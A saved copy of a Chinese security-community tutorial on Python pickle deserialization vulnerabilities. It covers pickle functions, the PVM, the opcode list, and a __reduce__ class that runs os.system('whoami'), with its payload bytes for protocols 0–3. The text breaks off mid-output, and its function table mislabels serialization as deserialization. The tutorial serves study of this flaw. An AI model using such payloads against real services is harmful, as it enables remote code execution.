@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<!-- saved from url=(0029)https://xz.aliyun.com/t/11082 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Python反序列化漏洞分析 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="./Python反序列化漏洞分析 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/editormd.min.css">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/tango.css">
+    <link href="./Python反序列化漏洞分析 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/topic.css">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/beautify.css">
+    
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/editormd.css">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./Python反序列化漏洞分析 - 先知社区_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="./Python反序列化漏洞分析 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
+    
+    
+    <script src="./Python反序列化漏洞分析 - 先知社区_files/jquery.fancybox.min.js.下载"></script>
+
+    <!-- <![endif]-->
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11082&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="https://xz.aliyun.com/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="./Python反序列化漏洞分析 - 先知社区_files/jquery.toc.min.js.下载"></script>
+    <script src="./Python反序列化漏洞分析 - 先知社区_files/toc.min.js.下载"></script>
+    <script src="./Python反序列化漏洞分析 - 先知社区_files/dt.js.下载"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">Python反序列化漏洞分析</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/38774">
+                        <span class="username cell"> H3rmesk1t</span></a> <span class="i-seprator"> / </span>
+                    <span> 2022-03-31 23:09:06</span><span class="i-seprator"> / </span>
+                    
+                    <span>浏览数 9457</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/1">技术文章</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/11">技术文章</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(11082);">
+             顶(0)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(11082);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h1>简介</h1>
+<p><code>Python</code>的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多.</p>
+<p><code>Python</code>中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p>
+<p>相较于<code>PHP</code>反序列化灵活多样的利用方式, 例如<code>POP</code>链构造, <code>Phar</code>反序列化, 原生类反序列化以及字符逃逸等. <code>Python</code>相对而言没有<code>PHP</code>那么灵活, 关于反序列化漏洞主要涉及这么几个概念: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>魔术方法. 本文主要来看看<code>pickle</code>模块的反序列化漏洞问题.</p>
+<h1>Pickle</h1>
+<h2 id="toc-0">简介</h2>
+<p><code>Pickle</code>可以用于<code>Python</code>特有的类型和<code>Python</code>的数据类型间进行转换(所有<code>Python</code>数据类型).</p>
+<p><code>Python</code>提供两个模块来实现序列化: <code>cPickle</code>和<code>pickle</code>. 这两个模块功能是一样的, 区别在于<code>cPickle</code>是<code>C</code>语言写的, 速度快; <code>pickle</code>是纯<code>Python</code>写的, 速度慢. 在<code>Python3</code>中已经没有<code>cPickle</code>模块. <code>pickle</code>有如下四种操作方法:</p>
+<table>
+<thead><tr>
+<th style="">函数</th>
+<th style="">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">dump</td>
+<td style="">对象反序列化到文件对象并存入文件</td>
+</tr>
+<tr>
+<td style="">dumps</td>
+<td style="">对象反序列化为 bytes 对象</td>
+</tr>
+<tr>
+<td style="">load</td>
+<td style="">对象反序列化并从文件中读取数据</td>
+</tr>
+<tr>
+<td style="">loads</td>
+<td style="">从 bytes 对象反序列化</td>
+</tr>
+</tbody>
+</table>
+<h2 id="toc-1">简单使用</h2>
+<h3 id="toc-2">序列化操作</h3>
+<ul>
+<li>代码<br>
+```python<br>
+import pickle</li>
+</ul>
+<p>class Demo():<br>
+    def <strong>init</strong>(self, name='h3rmesk1t'):<br>
+        self.name = name</p>
+<p>print(pickle.dumps(Demo()))</p>
+
+<pre><code>- Python3
+
+```python
+b'\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94}\x94\x8c\x04name\x94\x8c\th3rmesk1t\x94sb.'</code></pre>
+<ul>
+<li>Python2</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="n">i__main__</span>
+<span class="n">Demo</span>
+<span class="n">p0</span>
+<span class="p">(</span><span class="n">dp1</span>
+<span class="n">S</span><span class="s1">'name'</span>
+<span class="n">p2</span>
+<span class="n">S</span><span class="s1">'h3rmesk1t'</span>
+<span class="n">p3</span>
+<span class="n">sb</span><span class="o">.</span>
+</pre></div>
+<p>输出的一大串字符实际上是一串<code>PVM</code>操作码, 可以在<code>pickle.py</code>中看到关于这些操作码的详解.</p>
+<p><a id="img0" href="./Python反序列化漏洞分析 - 先知社区_files/20220324161920-1b17ac6e-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324161920-1b17ac6e-ab4b-1.png"></a></p>
+<h3 id="toc-3">反序列化操作</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="k">class</span> <span class="nc">Demo</span><span class="p">():</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">'h3rmesk1t'</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">'[+] 序列化'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Demo</span><span class="p">()))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">'[+] 反序列化'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Demo</span><span class="p">()))</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+</pre></div>
+<p><a id="img1" href="./Python反序列化漏洞分析 - 先知社区_files/20220324161947-2afae75e-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324161947-2afae75e-ab4b-1.png"></a></p>
+<h2 id="toc-4">PVM</h2>
+<h3 id="toc-5">组成部分</h3>
+<p><code>PVM</code>由三个部分组成:</p>
+<ul>
+<li>指令处理器: 从流中读取<code>opcode</code>和参数, 并对其进行解释处理. 重复这个动作, 直到遇到<code>.</code>这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.</li>
+<li>栈区(<code>stack</code>): 由<code>Python</code>的<code>list</code>实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.</li>
+<li>标签区(<code>memo</code>): 由<code>Python</code>的<code>dict</code>实现, 为<code>PVM</code>的整个生命周期提供存储.</li>
+</ul>
+<h3 id="toc-6">执行流程</h3>
+<p>首先, <code>PVM</code>会把源代码编译成字节码, 字节码是<code>Python</code>语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果<code>Python</code>进程在主机上有写入权限, 那么它会把程序字节码保存为一个以<code>.pyc</code>为扩展名的文件. 如果没有写入权限, 则<code>Python</code>进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.</p>
+<p>一般来说, 在构建程序时最好给<code>Python</code>进程在主机上的写入权限, 这样只要源代码没有改变, 生成的<code>.pyc</code>文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</p>
+<p>然后, <code>Python</code>进程会把编译好的字节码转发到<code>PVM</code>(<code>Python</code>虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成.</p>
+<h3 id="toc-7">指令集</h3>
+<p>当前用于<code>pickling</code>的协议共有<code>6</code>种, 使用的协议版本越高, 读取生成的<code>pickle</code>所需的<code>Python</code>版本就要越新.</p>
+<ul>
+<li><code>v0</code>版协议是原始的"人类可读"协议, 并且向后兼容早期版本的<code>Python</code>.</li>
+<li><code>v1</code>版协议是较早的二进制格式, 它也与早期版本的<code>Python</code>兼容.</li>
+<li><code>v2</code>版协议是在<code>Python 2.3</code>中引入的, 它为存储<code>new-style class</code>提供了更高效的机制, 参阅<code>PEP 307</code>.</li>
+<li><code>v3</code>版协议添加于<code>Python 3.0</code>, 它具有对<code>bytes</code>对象的显式支持, 且无法被<code>Python 2.x</code>打开, 这是目前默认使用的协议, 也是在要求与其他<code>Python 3</code>版本兼容时的推荐协议.</li>
+<li><code>v4</code>版协议添加于<code>Python 3.4</code>, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅<code>PEP 3154</code>.</li>
+<li><code>v5</code>版协议添加于<code>Python 3.8</code>, 它支持带外数据, 加速带内数据处理.</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+<span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
+<span class="c1"># pickletools groups them by purpose.</span>
+
+<span class="n">MARK</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'('</span>   <span class="c1"># push special markobject on stack</span>
+<span class="n">STOP</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'.'</span>   <span class="c1"># every pickle ends with STOP</span>
+<span class="n">POP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'0'</span>   <span class="c1"># discard topmost stack item</span>
+<span class="n">POP_MARK</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'1'</span>   <span class="c1"># discard stack top through topmost markobject</span>
+<span class="n">DUP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'2'</span>   <span class="c1"># duplicate top stack item</span>
+<span class="n">FLOAT</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'F'</span>   <span class="c1"># push float object; decimal string argument</span>
+<span class="n">INT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'I'</span>   <span class="c1"># push integer or bool; decimal string argument</span>
+<span class="n">BININT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'J'</span>   <span class="c1"># push four-byte signed int</span>
+<span class="n">BININT1</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'K'</span>   <span class="c1"># push 1-byte unsigned int</span>
+<span class="n">LONG</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'L'</span>   <span class="c1"># push long; decimal string argument</span>
+<span class="n">BININT2</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'M'</span>   <span class="c1"># push 2-byte unsigned int</span>
+<span class="n">NONE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'N'</span>   <span class="c1"># push None</span>
+<span class="n">PERSID</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'P'</span>   <span class="c1"># push persistent object; id is taken from string arg</span>
+<span class="n">BINPERSID</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'Q'</span>   <span class="c1">#  "       "         "  ;  "  "   "     "  stack</span>
+<span class="n">REDUCE</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'R'</span>   <span class="c1"># apply callable to argtuple, both on stack</span>
+<span class="n">STRING</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'S'</span>   <span class="c1"># push string; NL-terminated string argument</span>
+<span class="n">BINSTRING</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'T'</span>   <span class="c1"># push string; counted binary string argument</span>
+<span class="n">SHORT_BINSTRING</span><span class="o">=</span> <span class="sa">b</span><span class="s1">'U'</span>   <span class="c1">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
+<span class="n">UNICODE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'V'</span>   <span class="c1"># push Unicode string; raw-unicode-escaped'd argument</span>
+<span class="n">BINUNICODE</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'X'</span>   <span class="c1">#   "     "       "  ; counted UTF-8 string argument</span>
+<span class="n">APPEND</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span>   <span class="c1"># append stack top to list below it</span>
+<span class="n">BUILD</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'b'</span>   <span class="c1"># call __setstate__ or __dict__.update()</span>
+<span class="n">GLOBAL</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'c'</span>   <span class="c1"># push self.find_class(modname, name); 2 string args</span>
+<span class="n">DICT</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'d'</span>   <span class="c1"># build a dict from stack items</span>
+<span class="n">EMPTY_DICT</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'}'</span>   <span class="c1"># push empty dict</span>
+<span class="n">APPENDS</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'e'</span>   <span class="c1"># extend list on stack by topmost stack slice</span>
+<span class="n">GET</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'g'</span>   <span class="c1"># push item from memo on stack; index is string arg</span>
+<span class="n">BINGET</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'h'</span>   <span class="c1">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>
+<span class="n">INST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'i'</span>   <span class="c1"># build &amp; push class instance</span>
+<span class="n">LONG_BINGET</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'j'</span>   <span class="c1"># push item from memo on stack; index is 4-byte arg</span>
+<span class="n">LIST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'l'</span>   <span class="c1"># build list from topmost stack items</span>
+<span class="n">EMPTY_LIST</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">']'</span>   <span class="c1"># push empty list</span>
+<span class="n">OBJ</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'o'</span>   <span class="c1"># build &amp; push class instance</span>
+<span class="n">PUT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'p'</span>   <span class="c1"># store stack top in memo; index is string arg</span>
+<span class="n">BINPUT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'q'</span>   <span class="c1">#   "     "    "   "   " ;   "    " 1-byte arg</span>
+<span class="n">LONG_BINPUT</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'r'</span>   <span class="c1">#   "     "    "   "   " ;   "    " 4-byte arg</span>
+<span class="n">SETITEM</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'s'</span>   <span class="c1"># add key+value pair to dict</span>
+<span class="n">TUPLE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'t'</span>   <span class="c1"># build tuple from topmost stack items</span>
+<span class="n">EMPTY_TUPLE</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">')'</span>   <span class="c1"># push empty tuple</span>
+<span class="n">SETITEMS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'u'</span>   <span class="c1"># modify dict by adding topmost key+value pairs</span>
+<span class="n">BINFLOAT</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'G'</span>   <span class="c1"># push float; arg is 8-byte float encoding</span>
+
+<span class="n">TRUE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'I01</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+<span class="n">FALSE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'I00</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+
+<span class="c1"># Protocol 2</span>
+
+<span class="n">PROTO</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80</span><span class="s1">'</span>  <span class="c1"># identify pickle protocol</span>
+<span class="n">NEWOBJ</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x81</span><span class="s1">'</span>  <span class="c1"># build object by applying cls.__new__ to argtuple</span>
+<span class="n">EXT1</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x82</span><span class="s1">'</span>  <span class="c1"># push object from extension registry; 1-byte index</span>
+<span class="n">EXT2</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x83</span><span class="s1">'</span>  <span class="c1"># ditto, but 2-byte index</span>
+<span class="n">EXT4</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x84</span><span class="s1">'</span>  <span class="c1"># ditto, but 4-byte index</span>
+<span class="n">TUPLE1</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x85</span><span class="s1">'</span>  <span class="c1"># build 1-tuple from stack top</span>
+<span class="n">TUPLE2</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x86</span><span class="s1">'</span>  <span class="c1"># build 2-tuple from two topmost stack items</span>
+<span class="n">TUPLE3</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x87</span><span class="s1">'</span>  <span class="c1"># build 3-tuple from three topmost stack items</span>
+<span class="n">NEWTRUE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x88</span><span class="s1">'</span>  <span class="c1"># push True</span>
+<span class="n">NEWFALSE</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x89</span><span class="s1">'</span>  <span class="c1"># push False</span>
+<span class="n">LONG1</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8a</span><span class="s1">'</span>  <span class="c1"># push long from &lt; 256 bytes</span>
+<span class="n">LONG4</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8b</span><span class="s1">'</span>  <span class="c1"># push really big long</span>
+
+<span class="n">_tuplesize2code</span> <span class="o">=</span> <span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">,</span> <span class="n">TUPLE1</span><span class="p">,</span> <span class="n">TUPLE2</span><span class="p">,</span> <span class="n">TUPLE3</span><span class="p">]</span>
+
+<span class="c1"># Protocol 3 (Python 3.x)</span>
+
+<span class="n">BINBYTES</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'B'</span>   <span class="c1"># push bytes; counted binary string argument</span>
+<span class="n">SHORT_BINBYTES</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'C'</span>   <span class="c1">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
+
+<span class="c1"># Protocol 4</span>
+
+<span class="n">SHORT_BINUNICODE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8c</span><span class="s1">'</span>  <span class="c1"># push short string; UTF-8 length &lt; 256 bytes</span>
+<span class="n">BINUNICODE8</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8d</span><span class="s1">'</span>  <span class="c1"># push very long string</span>
+<span class="n">BINBYTES8</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8e</span><span class="s1">'</span>  <span class="c1"># push very long bytes string</span>
+<span class="n">EMPTY_SET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8f</span><span class="s1">'</span>  <span class="c1"># push empty set on the stack</span>
+<span class="n">ADDITEMS</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span>  <span class="c1"># modify set by adding topmost stack items</span>
+<span class="n">FROZENSET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x91</span><span class="s1">'</span>  <span class="c1"># build frozenset from topmost stack items</span>
+<span class="n">NEWOBJ_EX</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x92</span><span class="s1">'</span>  <span class="c1"># like NEWOBJ but work with keyword only arguments</span>
+<span class="n">STACK_GLOBAL</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x93</span><span class="s1">'</span>  <span class="c1"># same as GLOBAL but using names on the stacks</span>
+<span class="n">MEMOIZE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x94</span><span class="s1">'</span>  <span class="c1"># store top of the stack in memo</span>
+<span class="n">FRAME</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x95</span><span class="s1">'</span>  <span class="c1"># indicate the beginning of a new frame</span>
+
+<span class="c1"># Protocol 5</span>
+
+<span class="n">BYTEARRAY8</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x96</span><span class="s1">'</span>  <span class="c1"># push bytearray</span>
+<span class="n">NEXT_BUFFER</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x97</span><span class="s1">'</span>  <span class="c1"># push next out-of-band buffer</span>
+<span class="n">READONLY_BUFFER</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x98</span><span class="s1">'</span>  <span class="c1"># make top of stack readonly</span>
+</pre></div>
+<p>上文谈到了<code>opcode</code>是有多个版本的, 在进行序列化时可以通过<code>protocol=num</code>来选择<code>opcode</code>的版本, 指定的版本必须小于等于<code>5</code>.</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="k">class</span> <span class="nc">Demo</span><span class="p">():</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">'h3rmesk1t'</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">'whoami'</span><span class="p">,))</span>
+
+
+<span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'[+] pickle v{}: {}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="n">i</span><span class="p">)))</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v0</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">p0</span><span class="se">\n</span><span class="s1">(Vwhoami</span><span class="se">\n</span><span class="s1">p1</span><span class="se">\n</span><span class="s1">tp2</span><span class="se">\n</span><span class="s1">Rp3</span><span class="se">\n</span><span class="s1">.'</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v1</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">(X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamiq</span><span class="se">\x01</span><span class="s1">tq</span><span class="se">\x02</span><span class="s1">Rq</span><span class="se">\x03</span><span class="s1">.'</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v2</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80\x02</span><span class="s1">cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamiq</span><span class="se">\x01\x85</span><span class="s1">q</span><span class="se">\x02</span><span class="s1">Rq</span><span class="se">\x03</span><span class="s1">.'</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v3</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80\x03</span><span class="s1">cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamiq</span><span class="se">\x01\x85</span><span class="s1">q</span><span class="se">\x02</span><span class="s1">Rq</span><span class="se">\x03</span><span class="s1">.'</span>
